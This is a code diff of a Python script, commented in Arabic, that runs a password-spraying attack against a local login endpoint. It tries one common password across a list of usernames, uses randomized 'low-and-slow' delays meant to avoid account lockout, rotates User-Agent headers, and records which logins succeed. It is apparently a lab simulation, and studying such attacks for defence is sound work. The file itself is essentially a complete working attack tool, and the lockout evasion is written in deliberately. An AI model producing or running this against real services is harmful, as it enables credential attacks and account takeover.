@@ -2,66 +2,89 @@ import requests
 import time
 import random
 import json
+from datetime import datetime
 
 SERVER_URL = "http://127.0.0.1:5000/login"
 
-USERS = ["admin", "john.doe", "jane.smith", "mike.brown", "sara.jones"]
-PASSWORDS = ["Winter2024!", "Password123!", "Admin@123", "P@ssw0rd"]
+# قائمة المستخدمين (رش كلمة مرور واحدة على عدة حسابات)
+USERS = [
+    "admin",
+    "john.doe",
+    "jane.smith",
+    "mike.brown",
+    "sara.jones",
+    "alex.wang",
+    "lisa.chen",
+    "tom.harris"
+]
 
+# كلمة المرور الشائعة المستخدمة في Password Spraying
+SPRAY_PASSWORD = "Password123!"
 
-def main():
-    print(" بدء محاكاة هجوم Password Spraying")
-    print("=" * 50)
+# User-Agents مختلفة لمحاكاة سلوك واقعي
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "curl/7.81.0",
+    "python-requests/2.31.0"
+]
 
-    # اختر كلمة مرور واحدة
-    target_password = random.choice(PASSWORDS)
-    print(f" كلمة المرور المستخدمة: {target_password}")
+# تأخير منخفض لتجنّب القفل (Low-and-Slow)
+DELAY_RANGE = (3, 6)
 
-    results = []
+results = []
 
-    for i, username in enumerate(USERS, 1):
-        # تأخير عشوائي بين المحاولات
-        if i > 1:
-            delay = random.uniform(2, 5)
-            print(f" انتظار {delay:.1f} ثانية...")
-            time.sleep(delay)
+print("=" * 60)
+print(" Password Spraying Client Simulation Started")
+print(f" Target Password: {SPRAY_PASSWORD}")
+print("=" * 60)
 
-        print(f" المحاولة {i}: اختبار {username}")
+for idx, username in enumerate(USERS, start=1):
+    delay = random.uniform(*DELAY_RANGE)
+    time.sleep(delay)
 
-        try:
-            response = requests.post(
-                SERVER_URL,
-                json={"username": username, "password": target_password},
-                timeout=5
-            )
+    headers = {
+        "User-Agent": random.choice(USER_AGENTS)
+    }
 
-            result = {
-                'username': username,
-                'status_code': response.status_code,
-                'message': response.json().get('message', '')
-            }
-            results.append(result)
+    payload = {
+        "username": username,
+        "password": SPRAY_PASSWORD
+    }
 
-            if response.status_code == 200:
-                print(f"    نجح: {result['message']}")
-            elif response.status_code == 423:
-                print(f"    مقفل: {result['message']}")
-            else:
-                print(f"    فشل: {result['message']}")
+    try:
+        response = requests.post(
+            SERVER_URL,
+            json=payload,
+            headers=headers,
+            timeout=5
+        )
 
-        except Exception as e:
-            print(f"     خطأ: {str(e)}")
+        status = response.status_code
+        message = response.json().get("message", response.text)
 
-    # حفظ النتائج
-    with open('attack_results.json', 'w', encoding='utf-8') as f:
-        json.dump(results, f, ensure_ascii=False, indent=2)
+        print(f"[{idx}] User: {username:<12} | Status: {status}")
 
-    print("\n" + "=" * 50)
-    print(" تم حفظ النتائج في attack_results.json")
-    print("=" * 50)
+        results.append({
+            "timestamp": datetime.now().isoformat(),
+            "username": username,
+            "status_code": status,
+            "message": message,
+            "delay_seconds": round(delay, 2)
+        })
 
+    except Exception as e:
+        print(f"[{idx}] User: {username:<12} | ERROR: {str(e)}")
+        results.append({
+            "timestamp": datetime.now().isoformat(),
+            "username": username,
+            "error": str(e)
+        })
 
-if __name__ == '__main__':
+# حفظ نتائج الهجوم للتحليل
+with open("attack_results.json", "w", encoding="utf-8") as f:
+    json.dump(results, f, indent=2, ensure_ascii=False)
 
-    main()
-
+print("\n" + "=" * 60)
+print(" Simulation finished")
+print(" Results saved to attack_results.json")
+print("=" * 60)
